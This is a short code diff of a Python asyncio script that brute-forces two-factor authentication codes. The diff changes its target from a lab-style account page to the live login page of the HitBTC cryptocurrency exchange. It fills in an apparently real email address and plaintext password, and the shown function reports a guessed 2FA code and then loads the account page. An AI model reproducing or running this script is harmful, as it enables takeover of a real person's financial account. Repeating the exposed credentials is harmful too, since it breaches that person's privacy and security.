@@ -5,9 +5,9 @@ import time
 
 async def main():
     # Set up some variables to access the login and 2fa login pages
-    site = ""
-    username = ""
-    password = ""
+    site = "https://hitbtc.com/login"
+    username = "fascellnick@gmail.com"
+    password = "Nicho!@#$88"
 
     # A new client session for each attempt for this script
     # Each coroutine appended to the list will attempt at guessing the 2fa code
@@ -87,7 +87,7 @@ async def brute(site, session, username, password, mfacode):
     if status == 302:
         print(f'2fa valid with response code {status}')
         print(f'Success! mfa-code is: {mfacode}')
-        async with session.get(f'https://{site}/my-account?id=carlos') as resp:
+        async with session.get(f'https://{site}/') as resp:
             soup = BeautifulSoup(await resp.text(),'html.parser')
             print(soup)
         loop = asyncio.get_event_loop()
